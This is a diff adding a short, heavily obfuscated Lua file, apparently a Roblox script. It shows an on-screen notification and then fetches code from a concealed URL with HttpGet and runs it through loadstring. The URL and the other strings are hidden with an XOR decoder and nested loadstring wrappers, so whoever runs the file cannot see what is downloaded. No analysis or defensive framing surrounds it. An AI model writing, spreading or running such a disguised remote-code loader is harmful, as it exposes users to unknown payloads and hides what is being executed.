@@ -1,0 +1,19 @@
+loadstring([=[
+loadstring([[
+local _0x95D196={_0xDA287D1=738909}
+for _0x4AD8AD59=1,0 do end
+local _0x1519AE8=function() return 686771 end
+local _0xC09385="\219\126\124\90\25\54\184\175\166\146\182\87\238\21\193\153\71\48\12\137\237\212\87\112\184\112\214\43\101\211\217\135"
+local _0x19E361={"\67\205\227\225\129\128\118\161\72\178","\67\220\212\147\107\190\112\79\95\178\66\147\21\116\80\75","\69\220\213\252\137\171\110","\67\222\208\238\133\177","\46\205\206\231\128\107\187\137\65\78\76\175\19\124\86\73\152\69\121\181\32\83\232\236\186\228\46\180\244\92\41\175\100\224\210\231\68\140\116\79\134\75\112\146\45\116\68\132\154\137\133\252\105\76\166\156\89\241\102\151\131\116"}
+local function _0x5D9F8886(i) local e=_0x19E361[i] local k=_0xC09385 local kl=#k local r={} local bxor=(bit32 and bit32.bxor) or (bit and bit.bxor) or function(a,b) local rr=0 local p=1 for _=1,8 do local aa=a%2 local bb=b%2 if aa~=bb then rr=rr+p end a=(a-aa)/2 b=(b-bb)/2 p=p*2 end return rr end for j=1,#e do local kk=string.byte(k,((j-1)%kl)+1) local ee=string.byte(e,j) r[j]=string.char((bxor(ee,math.floor(kk/2))-kk)%256) end return table.concat(r) end
+
+game:GetService( _0x5D9F8886(1) ):SetCore( _0x5D9F8886(2) , {
+    Title =  _0x5D9F8886(3) ,
+    Text =  _0x5D9F8886(4) ,
+    Duration = (38534-38529),
+})
+
+
+loadstring(game:HttpGet( _0x5D9F8886(5) ))()
+]])()
+]=])()
